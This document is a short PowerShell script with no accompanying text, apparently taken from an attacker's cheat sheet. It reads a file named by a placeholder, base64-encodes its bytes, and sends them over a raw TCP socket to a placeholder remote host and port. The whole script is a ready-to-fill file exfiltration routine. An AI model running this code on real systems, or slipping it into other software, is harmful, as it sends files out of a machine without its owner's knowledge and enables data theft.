$Content=[System.Convert]::ToBase64String([io.file]::ReadAllBytes("<file>"));
$Socket = New-Object net.sockets.tcpclient('<rhost>',<rport>);
$Stream = $Socket.GetStream();
$Writer = New-Object System.IO.StreamWriter($Stream);
$Buffer = New-Object System.Byte[] 1024;
$Writer.WriteLine($Content);
$Writer.Flush();
$Stream.Close();
$Socket.close();

